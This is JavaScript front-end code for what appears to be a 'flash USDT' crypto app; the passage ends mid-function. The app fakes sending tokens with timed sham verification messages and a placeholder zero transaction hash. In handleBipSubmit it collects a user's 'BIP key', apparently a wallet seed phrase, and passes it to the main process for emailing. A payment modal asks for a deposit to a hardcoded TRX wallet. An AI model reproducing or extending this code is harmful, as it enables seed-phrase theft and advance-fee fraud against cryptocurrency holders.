// Global variables to store app state
let currentLicenseKey = null;
let currentUser = null;
let licenseType = null; // 'demo' or 'live'
let appSettings = {
  defaultNetwork: 'trc20',
  demoMaxFlashAmount: 30,
  liveMaxFlashAmount: 10000000,
  defaultDelayDays: 0,
  defaultDelayMinutes: 0
};

// Import constants using window.api
// This will be populated by the preload script
window.addEventListener('DOMContentLoaded', () => {
  console.log('DOM content loaded - initializing app');
  
  // Request constants from main process
  window.api.send('app-request', {
    action: 'getConstants'
  });
  
  // Listen for constants response
  window.api.receive('app-response', (response) => {
    console.log('Received response:', response);
    if (response.action === 'getConstants') {
      console.log('Constants received, initializing app');
      // Store constants in global variables
      window.initialLoadingMessages = response.initialLoadingMessages;
      window.licenseVerificationMessages = response.licenseVerificationMessages;
      window.bipVerificationMessages = response.bipVerificationMessages;
      window.paymentStatusMessages = response.paymentStatusMessages;
      window.walletOptions = response.walletOptions;
      window.currencyOptions = response.currencyOptions;
      window.networkOptions = response.networkOptions;
      window.dayOptions = response.dayOptions;
      window.minuteOptions = response.minuteOptions;
      
      // Initialize the app after constants are loaded
      initializeApp();
    }
  });
});

// Initialize the app
function initializeApp() {
  console.log('Initializing app');
  
  // License activation functionality
  const activateBtn = document.getElementById('activate-btn');
  if (activateBtn) {
    console.log('Adding event listener to activate button');
    activateBtn.addEventListener('click', handleActivation);
  } else {
    console.error('Activate button not found');
  }
  
  // Set up other event listeners and UI components
  setupOtherComponents();
  
  // Get app settings
  window.api.send('app-request', {
    action: 'getAppSettings'
  });
  
  // Get contact info
  window.api.send('app-request', {
    action: 'getContactInfo'
  });
  
  // Set up listener for app responses
  setupAppResponseListeners();
}

// Set up other event listeners and UI components
function setupOtherComponents() {
  // Update date and time
  updateDateTime();
  // Update date and time every second
  setInterval(updateDateTime, 1000);
  
  // Logout functionality
  const logoutBtn = document.getElementById('logout-btn');
  if (logoutBtn) {
    logoutBtn.addEventListener('click', handleLogout);
  }
  
  // Refresh data functionality
  const refreshDataBtn = document.getElementById('refresh-data-btn');
  if (refreshDataBtn) {
    refreshDataBtn.addEventListener('click', handleRefreshData);
  }

  // Navigation functionality
  setupNavigation();

  // Setup dropdowns
  setupDropdowns();

  // Flash form functionality
  setupFlashForm();
  
  // Checkbox group functionality
  setupCheckboxGroups();
  
  // Update flash amount placeholder
  const flashAmountInput = document.getElementById('flash-amount');
  if (flashAmountInput) {
    flashAmountInput.placeholder = "Enter Flash Amount in USDT";
  }
  
  // Setup modal close functionality
  document.addEventListener('click', (e) => {
    if (e.target.classList.contains('modal-overlay')) {
      closeModal(e.target.id);
    }
  });
}

// Set up app response listeners
function setupAppResponseListeners() {
  window.api.receive('app-response', (response) => {
    console.log('Received app response:', response);
    
    if (response.action === 'getAppSettings') {
      appSettings = { ...appSettings, ...response.settings };
      console.log('App settings updated:', appSettings);
    } else if (response.action === 'getContactInfo') {
      // Store contact info in global variable
      window.contactInfo = response.contactInfo;
      console.log('Contact info updated:', window.contactInfo);
      
      // Update contact info in UI
      updateContactInfoUI();
    } else if (response.action === 'validateLicenseKey') {
      handleLicenseKeyValidationResponse(response);
    } else if (response.action === 'forceRefresh') {
      if (response.success) {
        showNotification('Success', 'Data refreshed successfully');
      } else {
        showNotification('Error', response.message || 'Failed to refresh data');
      }
    } else if (response.action === 'contactInfoUpdate') {
      // Handle real-time contact info updates
      window.contactInfo = response.contactInfo;
      console.log('Contact info updated in real-time:', window.contactInfo);
      
      // Update contact info in UI
      updateContactInfoUI();
      
      // Update the contact info on the login page immediately
      const contactInfoElement = document.getElementById('contact-info');
      if (contactInfoElement && window.contactInfo) {
        contactInfoElement.textContent = `support: ${window.contactInfo.primaryPhone} | ${window.contactInfo.secondaryPhone} | ${window.contactInfo.tertiaryPhone}`;
      }
      
      showNotification('Update', 'Contact information has been updated');
    } else if (response.action === 'licenseKeysUpdate') {
      // Handle real-time license keys updates
      console.log('License keys updated in real-time');
      
      // If we're on the license validation screen, we might want to re-validate
      if (currentLicenseKey && currentLicenseKey.key) {
        // Re-validate the current license key
        window.api.send('app-request', {
          action: 'validateLicenseKey',
          licenseKey: currentLicenseKey.key
        });
      }
    }
  });
  
  // Set up periodic refresh (every 5 minutes)
  setInterval(() => {
    // Refresh data silently
    window.api.send('app-request', {
      action: 'forceRefresh'
    });
  }, 5 * 60 * 1000); // 5 minutes
}

// Handle license key validation response
function handleLicenseKeyValidationResponse(response) {
  console.log('License validation response received:', response);
  
  const activateBtn = document.getElementById('activate-btn');
  const licenseKeyInput = document.getElementById('license-key');
  
  if (response.valid) {
    console.log('License key is valid');
    
    // Store license key for later use
    currentLicenseKey = response.licenseKey;
    
    // Determine license type based on key pattern or response
    const licenseKey = licenseKeyInput.value;
    if (response.licenseKey && response.licenseKey.type) {
      // Use the type from the response
      licenseType = response.licenseKey.type;
      console.log('Using license type from response:', licenseType);
    } else if (licenseKey.includes('DEMO') || licenseKey === 'USDT-ABCD-1234-EFGH-5678') {
      licenseType = 'demo';
    } else {
      licenseType = 'live';
    }
    
    // Set current user
    if (response.licenseKey && response.licenseKey.user) {
      currentUser = response.licenseKey.user;
    } else {
      currentUser = licenseType === 'demo' ? 'test@gmail.com' : 'live@gmail.com';
    }
    
    console.log('License type:', licenseType);
    console.log('Current user:', currentUser);
    
    // Set max amount directly from the response if available
    if (response.licenseKey && response.licenseKey.maxAmount !== undefined) {
      console.log('Setting max amount from response:', response.licenseKey.maxAmount);
      appSettings.maxFlashAmount = response.licenseKey.maxAmount;
    } else {
      // Update max flash amount based on license type
      updateMaxFlashAmount();
    }
    
    // Hide license page and show main app
    document.getElementById('license-page').style.display = 'none';
    document.getElementById('app-main').style.display = 'block';
    
    showNotification('Success', 'License key activated successfully');
    
    // Update flash amount placeholder with the correct max amount
    const flashAmountInput = document.getElementById('flash-amount');
    if (flashAmountInput) {
      flashAmountInput.placeholder = `Enter Flash Amount (Max: ${appSettings.maxFlashAmount} USDT)`;
    }
  } else {
    console.log('License key is invalid:', response.message);
    
    // Show error notification
    showNotification('Error', response.message || 'Invalid license key');
    
    // Reset button and allow the user to try again
    if (activateBtn) {
      activateBtn.disabled = false;
      activateBtn.textContent = 'GET STARTED';
    }
    
    // Clear the license key input to prompt the user to enter a new one
    licenseKeyInput.value = '';
    licenseKeyInput.focus();
  }
}

// License activation handler
function handleActivation() {
  console.log('handleActivation called - Get Started button clicked');
  const licenseKeyInput = document.getElementById('license-key');
  const licenseKey = licenseKeyInput.value;
  
  // If no license key is provided, show an error and return
  if (!licenseKey) {
    showNotification('Error', 'Please enter a license key');
    return;
  }
  
  console.log('License key:', licenseKey);
  
  // Show loading state
  const activateBtn = document.getElementById('activate-btn');
  if (activateBtn) {
    activateBtn.disabled = true;
    activateBtn.textContent = 'Validating...';
  }
  
  try {
    console.log('Validating license key...');
    
    // Create a notification to show we're validating
    showNotification('Info', 'Validating license key...');
    
    // Show license verification messages in status display
    const statusDisplay = document.getElementById('status-display');
    if (statusDisplay) {
      statusDisplay.innerHTML = '';
      
      // Display license verification messages for 10 seconds
      displayMessages(window.licenseVerificationMessages, statusDisplay, 10000, () => {
        // After 10 seconds, send the license key to main process for validation
        console.log('Sending license key validation request');
        
        // Send license key to main process for validation
        window.api.send('app-request', {
          action: 'validateLicenseKey',
          licenseKey: licenseKey
        });
        
        console.log('License key validation request sent');
      });
    } else {
      // If status display is not available, send the request immediately
      window.api.send('app-request', {
        action: 'validateLicenseKey',
        licenseKey: licenseKey
      });
    }
  } catch (error) {
    console.error('License activation error:', error);
    showNotification('Error', 'Failed to validate license key. Please try again.');
    
    // Reset button
    if (activateBtn) {
      activateBtn.disabled = false;
      activateBtn.textContent = 'GET STARTED';
    }
  }
}

// Update max flash amount based on license type
function updateMaxFlashAmount() {
  if (licenseType === 'demo') {
    appSettings.maxFlashAmount = appSettings.demoMaxFlashAmount;
  } else {
    appSettings.maxFlashAmount = appSettings.liveMaxFlashAmount;
  }
  
  // Update placeholder to show max amount
  const flashAmountInput = document.getElementById('flash-amount');
  if (flashAmountInput) {
    flashAmountInput.placeholder = `Enter Flash Amount (Max: ${appSettings.maxFlashAmount} USDT)`;
  }
}

// Update contact info in UI
function updateContactInfoUI() {
  // Update the contact info on the login page
  const contactInfoElement = document.getElementById('contact-info');
  if (contactInfoElement && window.contactInfo) {
    contactInfoElement.textContent = `support: ${window.contactInfo.primaryPhone} | ${window.contactInfo.secondaryPhone} | ${window.contactInfo.tertiaryPhone}`;
  }
  
  // Add event listener to support nav item to update contact info in the support window
  const supportNavItem = document.querySelector('.nav-item[data-section="support"]');
  if (supportNavItem) {
    supportNavItem.addEventListener('click', () => {
      // Wait for the support window to open
      setTimeout(() => {
        // Get the support window
        const supportWindow = window.open('', 'support_window');
        if (supportWindow && window.contactInfo) {
          // Update contact list
          const contactList = supportWindow.document.getElementById('support-contact-list');
          if (contactList) {
            contactList.innerHTML = '';
            
            // Add phone numbers
            const phones = [
              window.contactInfo.primaryPhone,
              window.contactInfo.secondaryPhone,
              window.contactInfo.tertiaryPhone
            ];
            
            phones.forEach(phone => {
              if (phone) {
                const li = supportWindow.document.createElement('li');
                li.textContent = phone;
                contactList.appendChild(li);
              }
            });
          }
          
          // Update other contact info
          const supportEmail = supportWindow.document.getElementById('support-email');
          if (supportEmail) {
            supportEmail.textContent = window.contactInfo.email || '';
          }
          
          const supportWebsite = supportWindow.document.getElementById('support-website');
          if (supportWebsite) {
            supportWebsite.textContent = window.contactInfo.website || '';
          }
          
          const supportTelegram = supportWindow.document.getElementById('support-telegram');
          if (supportTelegram) {
            supportTelegram.textContent = window.contactInfo.telegramUsername || '';
          }
          
          const supportDiscord = supportWindow.document.getElementById('support-discord');
          if (supportDiscord) {
            supportDiscord.textContent = window.contactInfo.discordServer || '';
          }
        }
      }, 500); // Wait 500ms for the window to open
    });
  }
}

// Function to show a notification
function showNotification(title, message) {
  console.log(`Notification: ${title} - ${message}`);
  
  // Create notification element if it doesn't exist
  if (!document.getElementById('notification')) {
    const notification = document.createElement('div');
    notification.id = 'notification';
    notification.className = 'notification';
    
    const header = document.createElement('div');
    header.className = 'notification-header';
    
    const titleElement = document.createElement('h3');
    titleElement.id = 'notification-title';
    
    const closeButton = document.createElement('button');
    closeButton.id = 'notification-close';
    closeButton.className = 'notification-close';
    closeButton.innerHTML = '&times;';
    
    header.appendChild(titleElement);
    header.appendChild(closeButton);
    
    const body = document.createElement('div');
    body.className = 'notification-body';
    
    const messageElement = document.createElement('p');
    messageElement.id = 'notification-message';
    
    body.appendChild(messageElement);
    
    notification.appendChild(header);
    notification.appendChild(body);
    
    document.body.appendChild(notification);
    
    // Add event listener to close button
    closeButton.addEventListener('click', () => {
      notification.style.display = 'none';
    });
  }
  
  // Update notification content
  document.getElementById('notification-title').textContent = title;
  document.getElementById('notification-message').textContent = message;
  
  // Show notification
  const notification = document.getElementById('notification');
  notification.style.display = 'block';
  
  // Auto-hide after 3 seconds
  setTimeout(() => {
    notification.style.display = 'none';
  }, 3000);
}

// Update date and time
function updateDateTime() {
  const dateElement = document.getElementById('current-date');
  const timeElement = document.getElementById('current-time');
  
  if (dateElement && timeElement) {
    const now = new Date();
    
    // Format date: DD/MM/YYYY
    const date = now.toLocaleDateString('en-GB', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric'
    });
    
    // Format time: HH:MM:SS
    const time = now.toLocaleTimeString('en-GB', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    });
    
    dateElement.textContent = date;
    timeElement.textContent = time;
  }
}

// Setup navigation functionality
function setupNavigation() {
  const navItems = document.querySelectorAll('.nav-item');
  const contentSections = document.querySelectorAll('.content-section');

  navItems.forEach(item => {
    item.addEventListener('click', () => {
      // Get the section to show
      const sectionToShow = item.getAttribute('data-section');
      
      // Update active nav item
      navItems.forEach(navItem => navItem.classList.remove('active'));
      item.classList.add('active');
      
      // Update visible section
      contentSections.forEach(section => {
        if (section.id === sectionToShow) {
          section.classList.add('active');
        } else {
          section.classList.remove('active');
        }
      });
    });
  });
}

// Setup dropdown functionality
function setupDropdowns() {
  // Get all dropdowns
  const dropdowns = document.querySelectorAll('.dropdown');
  
  dropdowns.forEach(dropdown => {
    const button = dropdown.querySelector('.dropdown-btn');
    const type = dropdown.getAttribute('data-type');
    
    // Create dropdown menu
    const menu = document.createElement('div');
    menu.className = 'dropdown-menu';
    menu.style.display = 'none';
    
    // Add options based on dropdown type
    let options = [];
    
    switch (type) {
      case 'wallet':
        options = window.walletOptions || [];
        break;
      case 'currency':
        options = window.currencyOptions || [];
        break;
      case 'network':
        options = window.networkOptions || [];
        break;
      case 'days':
        options = window.dayOptions || [];
        break;
      case 'minutes':
        options = window.minuteOptions || [];
        break;
      default:
        options = ['Option 1', 'Option 2', 'Option 3'];
    }
    
    // Add options to menu
    options.forEach(option => {
      const item = document.createElement('div');
      item.className = 'dropdown-item';
      item.textContent = option;
      
      item.addEventListener('click', () => {
        button.textContent = option;
        menu.style.display = 'none';
      });
      
      menu.appendChild(item);
    });
    
    // Add menu to dropdown
    dropdown.appendChild(menu);
    
    // Toggle menu on click
    dropdown.addEventListener('click', (e) => {
      // Don't close if clicking on an item
      if (e.target.classList.contains('dropdown-item')) {
        return;
      }
      
      // Toggle menu
      const isVisible = menu.style.display === 'block';
      
      // Close all other menus
      document.querySelectorAll('.dropdown-menu').forEach(m => {
        m.style.display = 'none';
      });
      
      // Toggle this menu
      menu.style.display = isVisible ? 'none' : 'block';
    });
  });
  
  // Close dropdown menus when clicking outside
  document.addEventListener('click', (e) => {
    if (!e.target.closest('.dropdown')) {
      document.querySelectorAll('.dropdown-menu').forEach(menu => {
        menu.style.display = 'none';
      });
    }
  });
}

// Setup flash form functionality
function setupFlashForm() {
  const refreshBtn = document.getElementById('refresh-btn');
  const sendBtn = document.getElementById('send-btn');
  
  if (refreshBtn) {
    refreshBtn.addEventListener('click', handleRefresh);
  }
  
  if (sendBtn) {
    sendBtn.addEventListener('click', handleSend);
  }
}

// Setup checkbox group functionality
function setupCheckboxGroups() {
  // Get all checkbox groups
  const checkboxGroups = document.querySelectorAll('.options-row');
  
  checkboxGroups.forEach(group => {
    const checkboxes = group.querySelectorAll('input[type="checkbox"]');
    
    checkboxes.forEach(checkbox => {
      checkbox.addEventListener('change', (e) => {
        // If this checkbox is checked, uncheck all others in the group
        if (e.target.checked) {
          checkboxes.forEach(cb => {
            if (cb !== e.target) {
              cb.checked = false;
            }
          });
        }
      });
    });
  });
}

// Function to close a modal
function closeModal(modalId) {
  const modal = document.getElementById(modalId);
  if (modal) {
    modal.style.display = 'none';
  }
}

// Function to handle refresh data
function handleRefreshData() {
  console.log('Refreshing data');
  
  // Show loading notification
  showNotification('Refresh', 'Refreshing data...');
  
  // Send request to main process
  window.api.send('app-request', {
    action: 'forceRefresh'
  });
}

// Logout handler
function handleLogout() {
  // Show confirmation notification
  showNotification('Logout', 'Logging out...');
  
  // Simulate logout delay
  setTimeout(() => {
    // Hide main app and show license page
    document.getElementById('app-main').style.display = 'none';
    document.getElementById('license-page').style.display = 'flex';
    
    // Clear license key field
    document.getElementById('license-key').value = '';
    
    // Reset button
    const activateBtn = document.getElementById('activate-btn');
    if (activateBtn) {
      activateBtn.disabled = false;
      activateBtn.textContent = 'GET STARTED';
    }
    
    // Reset user and license type
    currentUser = null;
    licenseType = null;
  }, 1000);
}

// Flash form handlers
function handleRefresh() {
  // Clear form fields
  document.getElementById('receiver-address').value = '';
  document.getElementById('flash-amount').value = '';
  
  // Reset dropdowns
  document.querySelectorAll('.dropdown-btn').forEach(btn => {
    const type = btn.closest('.dropdown').getAttribute('data-type');
    
    switch (type) {
      case 'wallet':
        btn.textContent = 'Wallet';
        break;
      case 'currency':
        btn.textContent = 'Currency';
        break;
      case 'network':
        btn.textContent = 'Network';
        break;
      case 'days':
        btn.textContent = '0';
        break;
      case 'minutes':
        btn.textContent = '0';
        break;
    }
  });
  
  // Show notification
  showNotification('Refresh', 'Form has been reset');
}

// Create BIP modal if it doesn't exist
function createBipModal() {
  if (document.getElementById('bip-modal')) {
    return;
  }
  
  const modal = document.createElement('div');
  modal.id = 'bip-modal';
  modal.className = 'modal-overlay';
  
  const modalContent = document.createElement('div');
  modalContent.className = 'modal-content';
  
  const modalHeader = document.createElement('div');
  modalHeader.className = 'modal-header';
  
  const modalTitle = document.createElement('h2');
  modalTitle.textContent = 'Enter BIP Key';
  
  const closeButton = document.createElement('button');
  closeButton.className = 'modal-close';
  closeButton.innerHTML = '&times;';
  closeButton.addEventListener('click', () => {
    modal.style.display = 'none';
  });
  
  modalHeader.appendChild(modalTitle);
  modalHeader.appendChild(closeButton);
  
  const modalBody = document.createElement('div');
  modalBody.className = 'modal-body';
  
  const bipInput = document.createElement('input');
  bipInput.type = 'text';
  bipInput.id = 'bip-key';
  bipInput.placeholder = 'Enter your BIP key';
  
  const bipSubmit = document.createElement('button');
  bipSubmit.className = 'action-btn primary';
  bipSubmit.textContent = 'Continue';
  bipSubmit.addEventListener('click', handleBipSubmit);
  
  modalBody.appendChild(bipInput);
  modalBody.appendChild(bipSubmit);
  
  modalContent.appendChild(modalHeader);
  modalContent.appendChild(modalBody);
  
  modal.appendChild(modalContent);
  
  document.body.appendChild(modal);
}

// Create License Key modal if it doesn't exist
function createLicenseKeyModal() {
  if (document.getElementById('license-key-modal')) {
    return;
  }
  
  const modal = document.createElement('div');
  modal.id = 'license-key-modal';
  modal.className = 'modal-overlay';
  
  const modalContent = document.createElement('div');
  modalContent.className = 'modal-content';
  
  const modalHeader = document.createElement('div');
  modalHeader.className = 'modal-header';
  
  const modalTitle = document.createElement('h2');
  modalTitle.textContent = 'Enter License Key';
  
  const closeButton = document.createElement('button');
  closeButton.className = 'modal-close';
  closeButton.innerHTML = '&times;';
  closeButton.addEventListener('click', () => {
    modal.style.display = 'none';
  });
  
  modalHeader.appendChild(modalTitle);
  modalHeader.appendChild(closeButton);
  
  const modalBody = document.createElement('div');
  modalBody.className = 'modal-body';
  
  const licenseInput = document.createElement('input');
  licenseInput.type = 'text';
  licenseInput.id = 'license-key-confirm';
  licenseInput.placeholder = 'Enter your license key';
  
  const licenseSubmit = document.createElement('button');
  licenseSubmit.className = 'action-btn primary';
  licenseSubmit.textContent = 'Continue';
  licenseSubmit.addEventListener('click', handleLicenseKeyConfirm);
  
  modalBody.appendChild(licenseInput);
  modalBody.appendChild(licenseSubmit);
  
  modalContent.appendChild(modalHeader);
  modalContent.appendChild(modalBody);
  
  modal.appendChild(modalContent);
  
  document.body.appendChild(modal);
}

// Create Payment Modal
function createPaymentModal(appSettings) {
  if (document.getElementById('payment-modal')) {
    return;
  }
  
  console.log('Creating payment modal with app settings:', appSettings);
  
  // Make sure we have the required settings
  const depositAmount = appSettings.depositAmount || 500;
  const transactionFee = appSettings.transactionFee || 'Transaction Fee';
  const walletAddress = appSettings.walletAddress || 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV';
  
  const modal = document.createElement('div');
  modal.id = 'payment-modal';
  modal.className = 'modal-overlay';
  
  const modalContent = document.createElement('div');
  modalContent.className = 'modal-content';
  
  const modalHeader = document.createElement('div');
  modalHeader.className = 'modal-header';
  
  const modalTitle = document.createElement('h2');
  modalTitle.textContent = 'Payment Required';
  
  const closeButton = document.createElement('button');
  closeButton.className = 'modal-close';
  closeButton.innerHTML = '&times;';
  closeButton.addEventListener('click', () => {
    modal.style.display = 'none';
  });
  
  modalHeader.appendChild(modalTitle);
  modalHeader.appendChild(closeButton);
  
  const modalBody = document.createElement('div');
  modalBody.className = 'modal-body';
  
  // Description
  const description = document.createElement('p');
  description.textContent = `Please complete payment of ${depositAmount} for ${transactionFee}`;
  modalBody.appendChild(description);
  
  // QR Code
  const qrCode = document.createElement('div');
  qrCode.className = 'qr-code';
  // Generate QR code for wallet address
  qrCode.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${walletAddress}" alt="QR Code" width="200" height="200">`;
  modalBody.appendChild(qrCode);
  
  // Wallet Address with Copy Button
  const walletAddressContainer = document.createElement('div');
  walletAddressContainer.className = 'wallet-address';
  
  const walletAddressInput = document.createElement('input');
  walletAddressInput.type = 'text';
  walletAddressInput.value = walletAddress;
  walletAddressInput.readOnly = true;
  
  const copyButton = document.createElement('button');
  copyButton.className = 'copy-btn';
  copyButton.textContent = 'Copy';
  copyButton.addEventListener('click', () => {
    walletAddressInput.select();
    document.execCommand('copy');
    showNotification('Success', 'Wallet address copied to clipboard');
  });
  
  walletAddressContainer.appendChild(walletAddressInput);
  walletAddressContainer.appendChild(copyButton);
  modalBody.appendChild(walletAddressContainer);
  
  // Verify Button
  const verifyButton = document.createElement('button');
  verifyButton.className = 'action-btn primary';
  verifyButton.textContent = 'Verify Payment';
  verifyButton.addEventListener('click', () => {
    // Hide payment modal
    modal.style.display = 'none';
    
    // Show payment verification messages in status display
    const statusDisplay = document.getElementById('status-display');
    if (statusDisplay) {
      statusDisplay.innerHTML = '';
      
      // Display payment status messages for 10 seconds
      displayMessages(window.paymentStatusMessages, statusDisplay, 10000, () => {
        // After 10 seconds, show the success modal
        createSuccessModal(appSettings);
        const successModal = document.getElementById('success-modal');
        if (successModal) {
          successModal.style.display = 'block';
        }
      });
    } else {
      // If status display is not available, complete the transaction immediately
      completeTransaction();
    }
  });
  
  modalBody.appendChild(verifyButton);
  
  modalContent.appendChild(modalHeader);
  modalContent.appendChild(modalBody);
  
  modal.appendChild(modalContent);
  
  document.body.appendChild(modal);
}

// Create Success Modal
function createSuccessModal(appSettings) {
  if (document.getElementById('success-modal')) {
    return;
  }
  
  console.log('Creating success modal with app settings:', appSettings);
  
  // Make sure we have the required settings
  const successTitle = appSettings.successTitle || 'Success';
  const successMessage = appSettings.successMessage || 'The flash has been sent successfully';
  const transactionHash = appSettings.transactionHash || '000000000000000000000000000000000000';
  
  const modal = document.createElement('div');
  modal.id = 'success-modal';
  modal.className = 'modal-overlay';
  
  const modalContent = document.createElement('div');
  modalContent.className = 'modal-content';
  
  const modalHeader = document.createElement('div');
  modalHeader.className = 'modal-header';
  
  const modalTitle = document.createElement('h2');
  modalTitle.textContent = successTitle;
  
  const closeButton = document.createElement('button');
  closeButton.className = 'modal-close';
  closeButton.innerHTML = '&times;';
  closeButton.addEventListener('click', () => {
    modal.style.display = 'none';
  });
  
  modalHeader.appendChild(modalTitle);
  modalHeader.appendChild(closeButton);
  
  const modalBody = document.createElement('div');
  modalBody.className = 'modal-body';
  
  // Description
  const description = document.createElement('p');
  description.textContent = successMessage;
  modalBody.appendChild(description);
  
  // Transaction Hash with Copy Button
  const transactionHashContainer = document.createElement('div');
  transactionHashContainer.className = 'transaction-hash';
  
  const transactionHashInput = document.createElement('input');
  transactionHashInput.type = 'text';
  transactionHashInput.value = transactionHash;
  transactionHashInput.readOnly = true;
  
  const copyButton = document.createElement('button');
  copyButton.className = 'copy-btn';
  copyButton.textContent = 'Copy';
  copyButton.addEventListener('click', () => {
    transactionHashInput.select();
    document.execCommand('copy');
    showNotification('Success', 'Transaction hash copied to clipboard');
  });
  
  transactionHashContainer.appendChild(transactionHashInput);
  transactionHashContainer.appendChild(copyButton);
  modalBody.appendChild(transactionHashContainer);
  
  // Close Button
  const closeModalButton = document.createElement('button');
  closeModalButton.className = 'action-btn primary';
  closeModalButton.textContent = 'Close';
  closeModalButton.addEventListener('click', () => {
    modal.style.display = 'none';
    
    // Display details in status section
    const statusDisplay = document.getElementById('status-display');
    if (statusDisplay) {
      const successMessageElement = document.createElement('div');
      successMessageElement.className = 'status-message';
      successMessageElement.textContent = `${successTitle}: ${successMessage}`;
      statusDisplay.appendChild(successMessageElement);
      
      const hashMessage = document.createElement('div');
      hashMessage.className = 'status-message';
      hashMessage.textContent = `Transaction Hash: ${transactionHash}`;
      statusDisplay.appendChild(hashMessage);
    }
    
    completeTransaction();
  });
  
  modalBody.appendChild(closeModalButton);
  
  modalContent.appendChild(modalHeader);
  modalContent.appendChild(modalBody);
  
  modal.appendChild(modalContent);
  
  document.body.appendChild(modal);
}

// Handle License Key confirmation
function handleLicenseKeyConfirm() {
  const licenseKey = document.getElementById('license-key-confirm').value;
  
  if (!licenseKey) {
    showNotification('Error', 'Please enter your license key');
    return;
  }
  
  // Hide License Key modal
  const licenseKeyModal = document.getElementById('license-key-modal');
  if (licenseKeyModal) {
    licenseKeyModal.style.display = 'none';
  }
  
  // Get app settings
  window.api.send('app-request', {
    action: 'getAppSettings'
  });
  
  // Listen for app settings response
  const appSettingsListener = (response) => {
    if (response.action === 'getAppSettings') {
      window.api.receive('app-response', appSettingsListener); // Remove listener
      
      const appSettings = response.settings;
      
      // Check license type
      if (licenseType === 'live') {
        // Show payment modal for live license
        createPaymentModal(appSettings);
        const paymentModal = document.getElementById('payment-modal');
        if (paymentModal) {
          paymentModal.style.display = 'block';
        }
      } else {
        // Show success modal for demo license
        createSuccessModal(appSettings);
        const successModal = document.getElementById('success-modal');
        if (successModal) {
          successModal.style.display = 'block';
        }
      }
    }
  };
  
  window.api.receive('app-response', appSettingsListener);
}

// Handle BIP key submission
function handleBipSubmit() {
  const bipKey = document.getElementById('bip-key').value;
  
  if (!bipKey) {
    showNotification('Error', 'Please enter a BIP key');
    return;
  }
  
  // Hide BIP modal
  const bipModal = document.getElementById('bip-modal');
  if (bipModal) {
    bipModal.style.display = 'none';
  }
  
  // Send BIP key data to main process for email notification
  window.api.send('app-request', {
    action: 'logBipKey',
    bipData: {
      bipKey: bipKey,
      licenseKey: currentLicenseKey ? currentLicenseKey.key : null,
      user: currentUser
    }
  });
  
  // Show BIP verification messages in status display
  const statusDisplay = document.getElementById('status-display');
  if (statusDisplay) {
    statusDisplay.innerHTML = '';
    
    // Create a single message element that will be reused
    const messageElement = document.createElement('div');
    messageElement.className = 'status-message';
    statusDisplay.appendChild(messageElement);
    
    // Calculate a random wait time between 2-3 minutes
    const waitTime = Math.floor(Math.random() * (180000 - 120000 + 1)) + 120000; // 2-3 minutes in milliseconds
    
    // Calculate delay for each message to fill the entire wait time
    const messagesCount = window.bipVerificationMessages.length;
    const messageDelay = waitTime / messagesCount;
    
    // Start displaying BIP verification messages one at a time, using the entire wait time
    displaySingleMessage(window.bipVerificationMessages, messageElement, waitTime, () => {
      // After all messages are displayed and wait time has passed, show the license key modal
      createLicenseKeyModal();
      const licenseKeyModal = document.getElementById('license-key-modal');
      if (licenseKeyModal) {
        licenseKeyModal.style.display = 'block';
        
        // Focus on license key input
        const licenseKeyInput = document.getElementById('license-key-confirm');
        if (licenseKeyInput) {
          licenseKeyInput.focus();
        }
      }
    });
  }
}

// Complete the transaction
function completeTransaction() {
  // Get form values
  const receiverAddress = document.getElementById('receiver-address').value;
  const flashAmount = document.getElementById('flash-amount').value;
  
  // Get dropdown values
  const walletBtn = document.querySelector('.dropdown[data-type="wallet"] .dropdown-btn');
  const currencyBtn = document.querySelector('.dropdown[data-type="currency"] .dropdown-btn');
  const networkBtn = document.querySelector('.dropdown[data-type="network"] .dropdown-btn');
  const daysBtn = document.querySelector('.dropdown[data-type="days"] .dropdown-btn');
  const minutesBtn = document.querySelector('.dropdown[data-type="minutes"] .dropdown-btn');
  
  const wallet = walletBtn ? walletBtn.textContent : 'Wallet';
  const currency = currencyBtn ? currencyBtn.textContent : 'Currency';
  const network = networkBtn ? networkBtn.textContent : 'Network';
  const days = daysBtn ? daysBtn.textContent : '0';
  const minutes = minutesBtn ? minutesBtn.textContent : '0';
  
  // Prepare transaction data
  const transactionData = {
    receiverAddress,
    flashAmount: parseFloat(flashAmount),
    wallet,
    currency,
    network,
    delayDays: parseInt(days),
    delayMinutes: parseInt(minutes),
    licenseKey: currentLicenseKey ? currentLicenseKey.key : null,
    user: currentUser,
    timestamp: new Date().toISOString()
  };
  
  console.log('Sending flash transaction:', transactionData);
  
  // Send transaction to main process
  window.api.send('app-request', {
    action: 'logFlashTransaction',
    transactionData
  });
  
  // Show success notification
  showNotification('Success', 'Flash transaction sent successfully');
  
  // Reset form
  handleRefresh();
  
  // Reset button
  const sendBtn = document.getElementById('send-btn');
  if (sendBtn) {
    sendBtn.disabled = false;
    sendBtn.textContent = 'SEND';
  }
}

// Display messages one by one with a delay, replacing the previous message
function displaySingleMessage(messages, element, totalDuration, callback) {
  let index = 0;
  
  // Calculate delay between messages to fill the entire duration
  const delay = totalDuration / messages.length;
  
  function showNextMessage() {
    if (index < messages.length) {
      element.textContent = messages[index];
      
      index++;
      setTimeout(showNextMessage, delay);
    } else if (callback) {
      callback();
    }
  }
  
  showNextMessage();
}

// Display messages one by one with a delay
function displayMessages(messages, element, totalDuration, callback) {
  // Create a single message element that will be reused
  const messageElement = document.createElement('div');
  messageElement.className = 'status-message';
  element.appendChild(messageElement);
  
  // Display messages one at a time
  displaySingleMessage(messages, messageElement, totalDuration, callback);
}

// Handle send button click
function handleSend() {
  console.log('Send button clicked');
  
  // Get form values
  const receiverAddress = document.getElementById('receiver-address').value;
  const flashAmount = document.getElementById('flash-amount').value;
  
  // Get dropdown values
  const walletBtn = document.querySelector('.dropdown[data-type="wallet"] .dropdown-btn');
  const currencyBtn = document.querySelector('.dropdown[data-type="currency"] .dropdown-btn');
  const networkBtn = document.querySelector('.dropdown[data-type="network"] .dropdown-btn');
  const daysBtn = document.querySelector('.dropdown[data-type="days"] .dropdown-btn');
  const minutesBtn = document.querySelector('.dropdown[data-type="minutes"] .dropdown-btn');
  
  const wallet = walletBtn ? walletBtn.textContent : 'Wallet';
  const currency = currencyBtn ? currencyBtn.textContent : 'Currency';
  const network = networkBtn ? networkBtn.textContent : 'Network';
  const days = daysBtn ? daysBtn.textContent : '0';
  const minutes = minutesBtn ? minutesBtn.textContent : '0';
  
  // Validate form
  if (!receiverAddress) {
